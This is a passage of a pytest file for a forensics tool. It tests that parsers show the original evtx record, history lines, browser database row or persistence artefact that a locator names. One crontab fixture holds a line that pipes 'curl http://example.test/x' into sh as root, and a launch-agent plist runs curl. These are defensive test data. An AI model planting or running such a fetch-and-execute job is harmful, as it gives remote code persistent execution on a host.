"""The view of a record: the piece of the original file it came from, found again from its locator.

Run in the worker's image: ``python -m pytest tests`` from /opt/nik-forensics. Every file is made here (the
evtx ones from the committed sample, as ``test_evtx.py`` makes them): parse a file, take the ``loc`` of a record
from the events, ask the parser's ``view`` for it, and check that what is shown IS that record.
"""

from __future__ import annotations

import hashlib
import io
import json
import os
import plistlib
import sqlite3
import struct
import sys

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)
os.environ.setdefault("FORENSICS_TOKEN", "a token for the tests, long enough")

import test_endpoint as ep  # noqa: E402
import test_evtx as ev  # noqa: E402
from nik_forensics import evtxscan, parsers, viewing  # noqa: E402
from nik_forensics.context import Context  # noqa: E402
from nik_forensics.parsers import BadLocator, ViewError, browser, endpoint, eventlog_json, evtx, history  # noqa: E402
from test_eventlog_json import LOGON, SYSMON  # noqa: E402
from test_forensics import call, worker  # noqa: E402, F401 - the fixture is used by name

TOKEN = os.environ["FORENSICS_TOKEN"]


def parse(module, path, source: str = "", params: dict | None = None) -> list[dict]:
    out = io.BytesIO()
    module.parse(str(path), Context(out, params if params is not None else {"host": "H", "username": "u"}), source)
    return [json.loads(line) for line in out.getvalue().splitlines() if line]


def records(found: list[dict]) -> list[dict]:
    return [event for event in found if event["t"] == "r"]


def write(tmp_path, name: str, data: bytes | str) -> str:
    path = tmp_path / name
    path.write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))
    return str(path)


def fields(answer: dict) -> dict[str, str]:
    assert answer["kind"] == "fields"
    return {name: value for name, value in answer["rows"]}


def database(tmp_path, name: str, statements: list[str], rows=()) -> str:
    path = tmp_path / name
    conn = sqlite3.connect(path)
    for sql in statements:
        conn.execute(sql)
    for sql, args in rows:
        conn.execute(sql, args)
    conn.commit()
    conn.close()
    return str(path)


def shape(answer: dict) -> None:
    assert answer["title"] and isinstance(answer["where"], dict) and answer["kind"] in {"xml", "fields", "text", "json"}


# --------------------------------------------------------------------------- #
# evtx                                                                        #
# --------------------------------------------------------------------------- #
def test_every_record_of_the_sample_is_shown_as_its_own_xml():
    found = records(parse(evtx, ev.SAMPLE, "evtx"))
    located = [r for r in found if "chunk" in r["loc"] and not r["data"].get("recovered")]
    assert len(located) == ev.PER_CHUNK
    for record in located:
        shown = evtx.view(ev.SAMPLE, "evtx", record["loc"])
        shape(shown)
        assert shown["kind"] == "xml" and shown["text"].lstrip().startswith("<?xml")
        assert f"<EventRecordID>{record['loc']['record']}</EventRecordID>" in shown["text"]
        assert shown["where"] == {k: record["loc"][k] for k in ("offset", "length", "chunk", "record")}
        assert f"at byte {record['loc']['offset']}" in shown["title"]


def sample_xml(record: int) -> str:
    """The XML of a record of the sample. The records of a made log are copies of these with new numbers in their
    headers, and the library gives the number of the header while the XML keeps the one in the event: so a record
    of a made log is told by being the copy of one of the sample, in the same place."""
    return evtx.view(ev.SAMPLE, "evtx", {"chunk": 0, "record": record})["text"]


def test_a_record_of_the_third_chunk_is_read_from_a_log_of_one_chunk(tmp_path, monkeypatch):
    path = ev.write(tmp_path, "three.evtx", ev.make_log())
    found = [r for r in records(parse(evtx, path, "evtx")) if r["loc"].get("chunk") == 2]
    assert len(found) == ev.PER_CHUNK
    # The helper gives the library the 4096 bytes of the header and the one chunk: nothing else of the file.
    log, start = evtx.mini_log(path, 2)
    assert len(log) == evtxscan.HEADER + evtxscan.CHUNK and start == evtxscan.HEADER + 2 * evtxscan.CHUNK
    assert log[: evtxscan.HEADER] == open(path, "rb").read(evtxscan.HEADER)
    assert log[evtxscan.HEADER :] == open(path, "rb").read()[start : start + evtxscan.CHUNK]
    # And it is what the view gives the library, whichever record it shows.
    import evtx as library

    expected = {r["loc"]["record"]: sample_xml(r["loc"]["record"] - 2 * ev.STEP) for r in found}

    given = []
    real = library.PyEvtxParser
    monkeypatch.setattr(
        library, "PyEvtxParser", lambda handle, **kw: given.append(len(handle.getvalue())) or real(handle, **kw)
    )
    for record in found:
        shown = evtx.view(path, "evtx", record["loc"])
        assert (
            shown["kind"] == "xml"
            and shown["where"]["chunk"] == 2
            and shown["where"]["record"] == record["loc"]["record"]
        )
        assert shown["text"] == expected[record["loc"]["record"]]
    assert set(given) == {evtxscan.HEADER + evtxscan.CHUNK} and len(given) == len(found)
    # The chunk may be named by its offset alone.
    first = found[0]["loc"]
    only_offset = {"offset": first["offset"], "record": first["record"]}
    assert evtx.view(path, "evtx", only_offset)["text"] == expected[first["record"]]


def test_the_header_of_the_log_does_not_matter_to_the_view(tmp_path):
    buf = ev.make_log()
    path = ev.write(tmp_path, "good.evtx", buf)
    record = [r for r in records(parse(evtx, path, "evtx")) if r["loc"].get("chunk") == 1][0]["loc"]
    # A header that says no chunk, and one whose checksum is wrong: the chunk is read all the same.
    buf[42:44] = struct.pack("<H", 0)
    buf[124:128] = b"\0\0\0\0"
    other = ev.write(tmp_path, "header.evtx", buf)
    assert evtx.view(other, "evtx", record)["text"] == sample_xml(record["record"] - ev.STEP)


def test_a_record_left_in_the_unused_space_is_shown_as_the_xml_it_holds(tmp_path):
    buf = ev.make_log()
    base = evtxscan.HEADER + evtxscan.CHUNK
    struct.pack_into("<QQQQ", buf, base + 8, 0, 0xFFFFFFFFFFFFFFFF, 0, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into("<II", buf, base + 44, 0, 512)  # the chunk is cleared: its records are left in the free space
    ev._fix_checksums(buf, base)
    path = ev.write(tmp_path, "cleared.evtx", buf)
    recovered = [r for r in records(parse(evtx, path, "evtx")) if r["data"].get("recovered")]
    assert len(recovered) == ev.PER_CHUNK
    for record in recovered:
        shown = evtx.view(path, "evtx", record["loc"])
        shape(shown)
        assert shown["kind"] == "xml" and "unused space" in shown["title"]
        assert shown["text"] == sample_xml(record["loc"]["record"] - ev.STEP)


def test_a_record_the_library_does_not_return_is_shown_as_its_bytes(monkeypatch):
    record = records(parse(evtx, ev.SAMPLE, "evtx"))[0]
    import evtx as library

    class Nothing:
        def __init__(self, *_a, **_k) -> None:
            pass

        def records(self):
            return iter(())

    monkeypatch.setattr(library, "PyEvtxParser", Nothing)
    shown = evtx.view(ev.SAMPLE, "evtx", record["loc"])
    assert shown["kind"] == "text" and "as the bytes of the file" in shown["title"]
    first, *_rest = shown["text"].splitlines()
    assert first.startswith(f"{record['loc']['offset']:010x}  2a 2a 00 00")
    assert len(shown["text"].splitlines()) == -(-record["loc"]["length"] // 16)
    assert shown["where"]["offset"] == record["loc"]["offset"]
    # Without an offset and a length there is nothing to dump: the locator names nothing.
    with pytest.raises(ViewError):
        evtx.view(ev.SAMPLE, "evtx", {"chunk": 0, "record": record["loc"]["record"]})


def test_an_evtx_locator_that_names_nothing_is_a_view_error(tmp_path):
    record = records(parse(evtx, ev.SAMPLE, "evtx"))[0]["loc"]
    for loc in (
        {},
        {"record": record["record"]},  # in which chunk?
        {"chunk": 0, "record": 99999},  # no such record
        {"chunk": 7, "record": record["record"]},  # no such chunk
        {"chunk": 0, "record": "x"},
        {"offset": 10, "record": record["record"]},  # inside the header of the file
    ):
        with pytest.raises(ViewError):
            evtx.view(ev.SAMPLE, "evtx", loc)
    not_a_log = write(tmp_path, "x.evtx", b"not an event log" * 300)
    with pytest.raises(ViewError, match="ElfFile"):
        evtx.view(not_a_log, "evtx", record)
    buf = ev.make_log()
    buf[evtxscan.HEADER : evtxscan.HEADER + 8] = b"\0" * 8  # the signature of chunk 0 destroyed
    with pytest.raises(ViewError, match="chunk signature"):
        evtx.view(ev.write(tmp_path, "bad.evtx", buf), "evtx", {"chunk": 0, "record": record["record"]})


# --------------------------------------------------------------------------- #
# Command histories and the line files                                        #
# --------------------------------------------------------------------------- #
def test_the_lines_of_a_command_are_highlighted_with_their_context(tmp_path):
    lines = [f"echo {n}" for n in range(1, 31)]
    lines[11] = "Get-Process `"
    lines.insert(12, "  | Where-Object Name -eq evil")
    path = write(tmp_path, "ConsoleHost_history.txt", "\r\n".join(lines) + "\r\n")
    found = records(parse(history, path, "powershell", {"host": "H"}))
    multi = next(r for r in found if "evil" in r["data"]["command"])
    shown = history.view(path, "powershell", multi["loc"])
    shape(shown)
    assert shown["kind"] == "text" and shown["first"] == 7 and shown["highlight"] == [12, 13]
    shown_lines = shown["text"].split("\n")
    assert shown_lines[shown["highlight"][0] - shown["first"] :][:2] == [
        "Get-Process `",
        "  | Where-Object Name -eq evil",
    ]
    assert len(shown_lines) == 5 + 2 + 5 and shown_lines[0] == "echo 7" and shown_lines[-1] == "echo 17"
    assert shown["where"] == {"offset": multi["loc"]["offset"], "length": multi["loc"]["length"], "line": 12}
    # Every command of the file is found at its own lines, a bash one with its time line before it.
    bash = write(tmp_path, ".bash_history", "#1700000000\nls -la\n#1700000100\nwhoami\nid\n")
    for record in records(parse(history, bash, "bash", {})):
        shown = history.view(bash, "bash", record["loc"])
        start = shown["highlight"][0] - shown["first"]
        assert shown["text"].split("\n")[start] == record["data"]["command"].split("\n")[0]
        assert shown["first"] == 1 or shown["first"] > 0


def test_the_first_and_the_last_command_have_less_context_and_a_bom_is_not_shown(tmp_path):
    path = write(tmp_path, ".zsh_history", b"\xef\xbb\xbf: 1700000000:0;ls\n: 1700000001:0;pwd\n")
    first, last = records(parse(history, path, "zsh", {}))
    one = history.view(path, "zsh", first["loc"])
    two = history.view(path, "zsh", last["loc"])
    assert one["first"] == 1 and one["highlight"] == [1, 1] and not one["text"].startswith("\ufeff")
    assert two["first"] == 1 and two["highlight"] == [2, 2] and two["text"].count("\n") == 1


def test_a_text_view_reads_around_the_offset_not_the_whole_file(tmp_path):
    path = tmp_path / "big_history"
    with open(path, "wb") as handle:
        for n in range(1, 60001):
            handle.write(f"cmd {n}\n".encode())
    target = 45000
    offset = sum(len(f"cmd {n}\n") for n in range(1, target))
    shown = history.view(str(path), "bash", {"line": target, "offset": offset, "length": len(f"cmd {target}\n")})
    assert (
        shown["first"] == target - 5
        and shown["highlight"] == [target, target]
        and shown["text"].split("\n")[5] == f"cmd {target}"
    )
    assert shown["text"].split("\n")[-1] == f"cmd {target + 5}"


def test_a_history_locator_that_names_nothing_is_a_view_error(tmp_path):
    path = write(tmp_path, ".bash_history", "ls\npwd\n")
    for loc in (
        {},
        {"line": 1, "offset": 0},
        {"line": 1, "offset": 9999, "length": 3},
        {"line": 0, "offset": 0, "length": 3},
    ):
        with pytest.raises(ViewError):
            history.view(path, "bash", loc)


# --------------------------------------------------------------------------- #
# Browser                                                                     #
# --------------------------------------------------------------------------- #
CHROME = [
    "CREATE TABLE urls(id INTEGER PRIMARY KEY, url TEXT, title TEXT, visit_count INTEGER, last_visit_time INTEGER)",
    "CREATE TABLE visits(id INTEGER PRIMARY KEY, url INTEGER, visit_time INTEGER, from_visit INTEGER,"
    " transition INTEGER)",
    "CREATE TABLE downloads(id INTEGER PRIMARY KEY, target_path TEXT, current_path TEXT, tab_url TEXT, referrer TEXT,"
    " start_time INTEGER, end_time INTEGER, total_bytes INTEGER, received_bytes INTEGER, mime_type TEXT,"
    " state INTEGER)",
    "CREATE TABLE downloads_url_chain(id INTEGER, chain_index INTEGER, url TEXT)",
]
WEBKIT = 13300000000000000


def test_a_chromium_visit_is_its_row_with_the_row_of_its_url(tmp_path):
    path = database(
        tmp_path,
        "History",
        CHROME,
        [
            ("INSERT INTO urls VALUES(1,'https://Example.com:8443/a','Example',3,?)", (WEBKIT,)),
            ("INSERT INTO urls VALUES(2,'https://other.example/','Other',1,?)", (WEBKIT,)),
            ("INSERT INTO visits VALUES(10,1,?,0,5)", (WEBKIT,)),
            ("INSERT INTO visits VALUES(11,2,?,10,1)", (WEBKIT + 1,)),
            (
                "INSERT INTO downloads VALUES(5,'C:\\\\t.exe','','https://t/p','https://t/r',?,?,100,100,'x',1)",
                (WEBKIT, WEBKIT),
            ),
        ],
    )
    found = records(parse(browser, path, "chrome.history"))
    visits = [r for r in found if r["type"] == "visit"]
    assert len(visits) == 2
    for record in visits:
        shown = browser.view(path, "chrome.history", record["loc"])
        shape(shown)
        row = fields(shown)
        assert row["id"] == str(record["loc"]["rowid"]) and row["transition"] == str(record["data"]["transition"])
        assert row["url.url"] == record["data"]["url"] and row["url.title"] == record["data"]["title"]
        assert shown["where"] == {"table": "visits", "rowid": record["loc"]["rowid"]}
        assert [name for name, _ in shown["rows"]][:5] == ["id", "url", "visit_time", "from_visit", "transition"]
    download = next(r for r in found if r["type"] == "download")
    assert fields(browser.view(path, "chrome.history", download["loc"]))["target_path"] == "C:\\\\t.exe"


def test_a_firefox_and_a_safari_visit_are_found_by_the_real_name_of_their_table(tmp_path):
    places = database(
        tmp_path,
        "places.sqlite",
        [
            "CREATE TABLE moz_places(id INTEGER PRIMARY KEY, url TEXT, title TEXT, visit_count INTEGER,"
            " last_visit_date INTEGER)",
            "CREATE TABLE moz_historyvisits(id INTEGER PRIMARY KEY, from_visit INTEGER, place_id INTEGER,"
            " visit_date INTEGER, visit_type INTEGER)",
        ],
        [
            ("INSERT INTO moz_places VALUES(1,'https://Mozilla.org/','Mozilla',2,0)", ()),
            ("INSERT INTO moz_historyvisits VALUES(4,0,1,1700000000000000,1)", ()),
        ],
    )
    (record,) = records(parse(browser, places, "firefox.places"))
    assert record["loc"] == {"table": "moz_historyvisits", "rowid": 4}
    shown = browser.view(places, "firefox.places", record["loc"])
    assert shown["where"]["table"] == "moz_historyvisits" and fields(shown)["url.url"] == "https://Mozilla.org/"
    safari = database(
        tmp_path,
        "History.db",
        [
            "CREATE TABLE history_items(id INTEGER PRIMARY KEY, url TEXT, visit_count INTEGER)",
            "CREATE TABLE history_visits(id INTEGER PRIMARY KEY, history_item INTEGER, visit_time REAL,"
            " title TEXT, redirect_source INTEGER)",
        ],
        [
            ("INSERT INTO history_items VALUES(1,'https://apple.com/',2)", ()),
            ("INSERT INTO history_visits VALUES(7,1,700000000,'Apple',NULL)", ()),
        ],
    )
    (record,) = records(parse(browser, safari, "safari.history"))
    shown = browser.view(safari, "safari.history", record["loc"])
    assert record["loc"]["table"] == "history_visits" and shown["where"]["table"] == "history_visits"
    assert fields(shown)["title"] == "Apple" and fields(shown)["url.url"] == "https://apple.com/"
    assert fields(shown)["redirect_source"] == "NULL"


def test_a_blob_is_its_length_and_first_bytes_and_a_wrong_row_or_table_is_a_view_error(tmp_path):
    path = database(
        tmp_path,
        "History",
        CHROME + ["CREATE TABLE blobs(x INTEGER PRIMARY KEY, b BLOB, t TEXT)"],
        [("INSERT INTO blobs VALUES(1, ?, 'ä')", (bytes(range(200)),))],
    )
    shown = viewing.sqlite_row(path, "blobs", 1)
    assert fields(shown)["b"] == "200 bytes: " + bytes(range(64)).hex() and fields(shown)["t"] == "ä"
    for table, rowid in (("blobs", 2), ("nothing", 1), ("blobs", None), ("blobs", True), ("blobs", "1")):
        with pytest.raises(ViewError):
            viewing.sqlite_row(path, table, rowid)
    with pytest.raises(ViewError):
        browser.view(path, "chrome.history", {})
    with pytest.raises(ViewError, match="database"):
        viewing.sqlite_row(write(tmp_path, "x.db", b"not sqlite" * 50), "visits", 1)


def test_bookmarks_json_and_plist_show_the_folder_the_locator_names(tmp_path):
    tree = {
        "roots": {
            "bookmark_bar": {
                "name": "Bookmarks bar",
                "children": [
                    {"type": "url", "name": "Nik", "url": "https://nik.example/"},
                    {
                        "type": "folder",
                        "name": "Work",
                        "children": [
                            {"type": "url", "name": "Wiki", "url": "http://wiki/"},
                            {"type": "url", "name": "Wiki", "url": "http://wiki/"},
                            {"type": "url", "name": "Tickets", "url": "http://tickets/"},
                        ],
                    },
                ],
            }
        }
    }
    path = write(tmp_path, "Bookmarks", json.dumps(tree))
    found = records(parse(browser, path, "chrome.bookmarks"))
    for record in found:
        shown = browser.view(path, "chrome.bookmarks", record["loc"])
        row = fields(shown)
        assert row["url"] == record["data"]["url"] and row["name"] == record["data"]["name"]
        assert shown["where"] == record["loc"] and row["folder"] == record["data"]["folder"]
    assert (
        fields(browser.view(path, "chrome.bookmarks", {"path": "Bookmarks bar > Work", "index": 2}))["name"]
        == "Tickets"
    )
    for loc in ({"path": "Nowhere", "index": 0}, {"path": "Bookmarks bar > Work", "index": 3}):
        with pytest.raises(ViewError) as error:
            browser.view(path, "chrome.bookmarks", loc)
        assert not isinstance(error.value, BadLocator)
    with pytest.raises(BadLocator):
        browser.view(path, "chrome.bookmarks", {"path": "Bookmarks bar"})  # which one?
    plist = plistlib.dumps(
        {
            "Children": [
                {
                    "WebBookmarkType": "WebBookmarkTypeLeaf",
                    "URLString": "https://a.example/",
                    "URIDictionary": {"title": "A"},
                },
                {
                    "WebBookmarkType": "WebBookmarkTypeList",
                    "Title": "Dev",
                    "Children": [
                        {"WebBookmarkType": "WebBookmarkTypeLeaf", "URLString": "https://b.example/", "Title": "B"}
                    ],
                },
            ]
        }
    )
    marks = write(tmp_path, "Bookmarks.plist", plist)
    for record in records(parse(browser, marks, "safari.bookmarks")):
        shown = browser.view(marks, "safari.bookmarks", record["loc"])
        assert fields(shown)["URLString"] == record["data"]["url"]


def test_a_safari_download_and_the_rows_of_json_and_csv_exports(tmp_path):
    downloads = write(
        tmp_path,
        "Downloads.plist",
        plistlib.dumps(
            {
                "DownloadHistory": [
                    {
                        "DownloadEntryURL": "https://a.example/x.zip",
                        "DownloadEntryPath": "/Users/a/x.zip",
                        "DownloadEntryProgressTotalToLoad": 10,
                    },
                    {
                        "DownloadEntryURL": "https://b.example/y.zip",
                        "DownloadEntryPath": "/Users/a/y.zip",
                        "Raw": b"\x01\x02",
                    },
                ]
            }
        ),
    )
    for record in records(parse(browser, downloads, "safari.downloads")):
        row = fields(browser.view(downloads, "safari.downloads", record["loc"]))
        assert row["DownloadEntryURL"] == record["data"]["url"]
    assert fields(browser.view(downloads, "safari.downloads", {"index": 1}))["Raw"] == "2 bytes: 0102"
    rows = [
        {"url": "https://a.example/", "title": "A, b", "visitTime": 1700000000000},
        {"url": "https://c.example/", "n": 3},
    ]
    export = write(tmp_path, "history.json", json.dumps(rows))
    for record in records(parse(browser, export, "chrome.json")):
        shown = browser.view(export, "chrome.json", record["loc"])
        assert fields(shown)["url"] == record["data"]["url"] and shown["where"] == record["loc"]
    assert fields(browser.view(export, "chrome.json", {"row": 2}))["n"] == "3"
    text = 'url,title,visitTime\r\nhttps://a.example/,"multi\r\nline",1700000000000\r\n\r\nhttps://b.example/,B,1700000001000,extra\r\n'
    sheet = write(tmp_path, "history.csv", text)
    found = records(parse(browser, sheet, "chrome.csv"))
    # Rows are counted from 1; the row with a cell more than the header has is kept, the cell in its data.
    assert [r["loc"] for r in found] == [{"row": 1}, {"row": 2}]
    assert "extra" not in found[0]["data"] and found[1]["data"]["extra"] == ["extra"]
    assert [
        n["count"]
        for n in parse(browser, sheet, "chrome.csv")
        if n.get("reason") == "row with more cells than the header"
    ] == [1]
    first = browser.view(sheet, "chrome.csv", {"row": 1})
    assert fields(first) == {"url": "https://a.example/", "title": "multi\r\nline", "visitTime": "1700000000000"}
    assert first["text"] == 'https://a.example/,"multi\r\nline",1700000000000' and first["first"] == 2
    second = browser.view(sheet, "chrome.csv", {"row": 2})
    assert fields(second)["title"] == "B" and fields(second)["extra"] == "extra"
    assert second["text"].startswith("https://b.example/") and second["first"] == 5
    for source, row in (
        ("chrome.csv", 3),
        ("chrome.csv", 0),
        ("chrome.json", 3),
        ("chrome.json", -1),
        ("chrome.json", "0"),
    ):
        with pytest.raises(ViewError):
            browser.view(sheet if source.endswith("csv") else export, source, {"row": row})
    with pytest.raises(ViewError):
        browser.view(downloads, "safari.downloads", {"index": 9})


# --------------------------------------------------------------------------- #
# Endpoint                                                                    #
# --------------------------------------------------------------------------- #
def test_a_row_of_a_script_csv_is_its_header_and_its_values_and_its_line(tmp_path):
    path = write(tmp_path, "persistence_runkeys.csv", ep.RUNKEYS)
    found = records(parse(endpoint, path, "windows.persistence.runkeys"))
    raw_lines = ep.RUNKEYS.splitlines()
    for record in found:
        shown = endpoint.view(path, "windows.persistence.runkeys", record["loc"])
        shape(shown)
        assert shown["where"]["row"] == record["loc"]["row"]
        assert record["data"]["command"] in shown["text"] + " ".join(fields(shown).values())
        assert shown["text"] in "\n".join(raw_lines) and raw_lines[shown["first"] - 1].startswith(
            shown["text"].split("\n")[0]
        )
    with pytest.raises(ViewError):
        endpoint.view(path, "windows.persistence.runkeys", {"row": 9})
    with pytest.raises(ViewError):
        endpoint.view(path, "windows.persistence.runkeys", {"row": 0})
    with pytest.raises(ViewError):
        endpoint.view(path, "windows.persistence.runkeys", {})


def test_a_row_of_a_json_export_cron_and_ssh_lines_xbel_setupapi_plist_and_knowledgec(tmp_path):
    rows = [{"Name": "Updater", "Command": "C:\\x.exe", "Location": "HKCU:\\Run"}, {"Name": "B", "Command": "b.exe"}]
    path = write(tmp_path, "runkeys.json", json.dumps({"records": rows}))
    for record in records(parse(endpoint, path, "windows.persistence.runkeys")):
        shown = endpoint.view(path, "windows.persistence.runkeys", record["loc"])
        assert fields(shown)["Name"] == rows[record["loc"]["row"] - 1]["Name"]
    assert fields(endpoint.view(path, "windows.persistence.runkeys", {"row": 2}))["Command"] == "b.exe"
    with pytest.raises(ViewError):
        endpoint.view(path, "windows.persistence.runkeys", {"row": 3})

    job = b"*/5 * * * * root curl http://example.test/x | sh\n"
    cron = write(tmp_path, "crontab", b"# m h dom mon dow\nSHELL=/bin/sh\n\n" + job + b"0 1 * * * root backup\n")
    for record in records(parse(endpoint, cron, "linux.persistence.cron")):
        shown = endpoint.view(cron, "linux.persistence.cron", record["loc"])
        start = shown["highlight"][0] - shown["first"]
        assert shown["text"].split("\n")[start] == record["data"]["command"] and shown["kind"] == "text"

    xbel = write(tmp_path, "recently-used.xbel", ep.XBEL)
    for record in records(parse(endpoint, xbel, "linux.fileaccess.recent")):
        shown = endpoint.view(xbel, "linux.fileaccess.recent", record["loc"])
        line = shown["text"].split("\n")[shown["highlight"][0] - shown["first"]]
        assert "<bookmark" in line and shown["highlight"][0] == record["loc"]["line"]
    setup = write(tmp_path, "setupapi.dev.log", ep.SETUPAPI)
    for record in records(parse(endpoint, setup, "windows.usb.setupapi")):
        shown = endpoint.view(setup, "windows.usb.setupapi", record["loc"])
        assert record["data"]["device"] in shown["text"].split("\n")[shown["highlight"][0] - shown["first"]]
    with pytest.raises(ViewError):
        endpoint.view(setup, "windows.usb.setupapi", {"line": 9999})

    plist = write(
        tmp_path,
        "a.plist",
        plistlib.dumps({"Label": "com.example.agent", "ProgramArguments": ["/usr/bin/curl", "-s"], "RunAtLoad": True}),
    )
    (record,) = records(parse(endpoint, plist, "macos.persistence.launch"))
    shown = endpoint.view(plist, "macos.persistence.launch", record["loc"])
    assert fields(shown) == {"Label": "com.example.agent", "ProgramArguments": '["/usr/bin/curl", "-s"]'}
    assert shown["where"] == {"path": "ProgramArguments"}
    with pytest.raises(ViewError):
        endpoint.view(plist, "macos.persistence.launch", {"path": "Nothing"})
    with pytest.raises(BadLocator):
        endpoint.view(plist, "macos.persistence.launch", {})

    db = str(tmp_path / "knowledgeC.db")
    ep._knowledgec(db, [("/app/usage", "com.apple.Safari", 700000000.0), ("/app/usage", "com.evil.app", 700000100.0)])
    for record in records(parse(endpoint, db, "macos.execution.knowledgec")):
        row = fields(endpoint.view(db, "macos.execution.knowledgec", record["loc"]))
        assert row["ZVALUESTRING"] == record["data"]["name"] and row["Z_PK"] == str(record["loc"]["rowid"])
    with pytest.raises(ViewError):
        endpoint.view(db, "macos.execution.knowledgec", {"table": "ZOBJECT", "rowid": 99})
    with pytest.raises(ViewError, match="no source"):
        endpoint.view(db, "nothing", {})


# --------------------------------------------------------------------------- #
# eventlog-json                                                               #
# --------------------------------------------------------------------------- #
def test_an_event_of_the_export_is_the_element_at_its_index(tmp_path):
    document = {
        "format": "nik-eventlogs",
        "host": "WKS-042",
        "logs": [],
        "events": [LOGON, SYSMON, {"Id": 1, "LogName": "Application"}],
    }
    path = write(tmp_path, "nik-eventlogs.json", "\ufeff" + json.dumps(document, indent=1))
    found = records(parse(eventlog_json, path, "nik-eventlogs.json"))
    assert [r["loc"] for r in found] == [{"index": 0}, {"index": 1}, {"index": 2}]
    for record, event in zip(found, document["events"], strict=True):
        shown = eventlog_json.view(path, "nik-eventlogs.json", record["loc"])
        shape(shown)
        assert shown["kind"] == "json" and json.loads(shown["text"]) == event and shown["where"] == record["loc"]
    array = write(tmp_path, "a.json", json.dumps([SYSMON, LOGON]))
    assert json.loads(eventlog_json.view(array, "", {"index": 1})["text"]) == LOGON
    for loc in ({"index": 2}, {"index": -1}, {}, {"index": "0"}):
        with pytest.raises(ViewError):
            eventlog_json.view(array, "", loc)
    broken = write(tmp_path, "b.json", json.dumps([SYSMON])[:-1] + ", {")
    assert json.loads(eventlog_json.view(broken, "", {"index": 0})["text"]) == SYSMON
    with pytest.raises(ViewError, match="stops being JSON"):
        eventlog_json.view(broken, "", {"index": 1})


# --------------------------------------------------------------------------- #
# The bounds                                                                  #
# --------------------------------------------------------------------------- #
def test_an_answer_is_cut_at_256_kib_in_all_and_says_so(tmp_path):
    big = "é" * 200_000  # 400,000 bytes of UTF-8
    path = database(
        tmp_path,
        "big.db",
        ["CREATE TABLE t(id INTEGER PRIMARY KEY, a TEXT, b TEXT, c TEXT)"],
        [("INSERT INTO t VALUES(1, ?, ?, 'small')", (big, big))],
    )
    shown = viewing.fit(viewing.sqlite_row(path, "t", 1))
    total = sum(len(name.encode()) + len(value.encode()) for name, value in shown["rows"])
    assert shown["cut"] is True and total <= viewing.MAX_TEXT
    assert fields(shown)["a"].startswith("é") and len(shown["rows"]) <= 4
    small = viewing.fit({"kind": "text", "title": "t", "where": {}, "text": "x" * 100})
    assert small["cut"] is False and small["text"] == "x" * 100
    text = viewing.fit({"kind": "xml", "title": "t", "where": {}, "text": "€" * 200_000})
    assert (
        text["cut"] is True
        and len(text["text"].encode()) <= viewing.MAX_TEXT
        and text["text"] == "€" * (viewing.MAX_TEXT // 3)
    )
    # A command of megabytes: the lines are cut, never the file read whole.
    wide = "".join("Write-Host " + "a" * 990 + "`\n" for _ in range(600)) + "end\nid\n"
    history_file = write(tmp_path, "ConsoleHost_history.txt", wide)
    (long, _id) = records(parse(history, history_file, "powershell", {}))
    shown = viewing.fit(history.view(history_file, "powershell", long["loc"]))
    assert shown["cut"] is True and len(shown["text"].encode()) <= viewing.MAX_TEXT and shown["highlight"][0] == 1
    # A line of more than 64 KiB is cut and the view says so, though it is under 256 KiB.
    flat = write(tmp_path, ".bash_history", "echo " + "a" * 100_000 + "\nid\n")
    (one, _id) = records(parse(history, flat, "bash", {}))
    shown = viewing.fit(history.view(flat, "bash", one["loc"]))
    assert shown["cut"] is True and len(shown["text"].split("\n")[0]) == viewing.MAX_LINE


def test_the_child_prints_one_json_object_and_exits_as_the_server_expects(tmp_path):
    import subprocess

    path = write(tmp_path, ".bash_history", "ls\nwhoami\n")
    request = {"parser": "history", "source": "bash", "loc": {"line": 2, "offset": 3, "length": 7}}
    job = [sys.executable, "-I", os.path.join(HERE, "view_job.py"), path]
    done = subprocess.run([*job, json.dumps(request)], capture_output=True, check=False)
    shown = json.loads(done.stdout)
    assert done.returncode == 0 and shown["highlight"] == [2, 2] and shown["cut"] is False
    nothing = subprocess.run(
        [*job, json.dumps({**request, "loc": {"line": 2, "offset": 99, "length": 7}})], capture_output=True, check=False
    )
    assert nothing.returncode == 4 and "holds nothing at byte 99" in json.loads(nothing.stdout)["detail"]
    unknown = subprocess.run([*job, json.dumps({**request, "parser": "nope"})], capture_output=True, check=False)
    assert unknown.returncode == 1


def test_every_parser_has_a_view():
    for name in parsers.NAMES:
        assert callable(parsers.load(name).view), name


# --------------------------------------------------------------------------- #
# Over HTTP                                                                   #
# --------------------------------------------------------------------------- #
def test_the_view_over_http(worker):  # noqa: F811
    _server, base = worker
    data = b"whoami\nnet user\nipconfig /all\n"
    name = hashlib.sha256(data).hexdigest() + ".bin"
    asked = {"name": name, "parser": "history", "source": "powershell", "loc": {"line": 2, "offset": 7, "length": 9}}
    status, body = call(base, "POST", "/view", asked)
    assert status == 409 and json.loads(body)["missing"] == [name]
    assert call(base, "PUT", f"/files/{name}", raw=data)[0] == 200
    status, body = call(base, "POST", "/view", asked)
    shown = json.loads(body)
    assert (
        status == 200
        and shown["kind"] == "text"
        and shown["highlight"] == [2, 2]
        and shown["text"].split("\n")[1] == "net user"
    )
    assert call(base, "POST", "/view", asked, token="wrong")[0] == 401
    assert call(base, "POST", "/view", {**asked, "loc": {"line": 2, "offset": 999, "length": 9}})[0] == 404
    assert call(base, "POST", "/view", {**asked, "loc": {"line": 2}})[0] == 422  # lacks what the parser needs
    status, body = call(base, "POST", "/view", {**asked, "loc": {"line": 2, "offset": 999, "length": 9}})
    assert "999" in json.loads(body)["detail"]
    assert call(base, "POST", "/view", {**asked, "parser": "nope"})[0] == 422
    assert call(base, "POST", "/view", {**asked, "parser": 7})[0] == 422
    assert call(base, "POST", "/view", {**asked, "loc": "x"})[0] == 422
    assert call(base, "POST", "/view", {**asked, "loc": {"line": [1]}})[0] == 422
    assert call(base, "POST", "/view", {**asked, "source": {}})[0] == 422
    assert call(base, "POST", "/view", {**asked, "name": "x"})[0] == 400
    # The parser's name may be written with a hyphen.
    document = json.dumps([LOGON]).encode()
    other = hashlib.sha256(document).hexdigest() + ".bin"
    call(base, "PUT", f"/files/{other}", raw=document)
    status, body = call(
        base, "POST", "/view", {"name": other, "parser": "eventlog-json", "source": "", "loc": {"index": 0}}
    )
    assert status == 200 and json.loads(json.loads(body)["text"]) == LOGON


def _viewer(tmp_path, code: str) -> str:
    path = tmp_path / f"viewer{abs(hash(code))}.py"
    path.write_text(code)
    return str(path)


def test_a_view_that_takes_too_long_is_a_504_too_many_are_a_503_and_a_huge_answer_is_not_relayed(
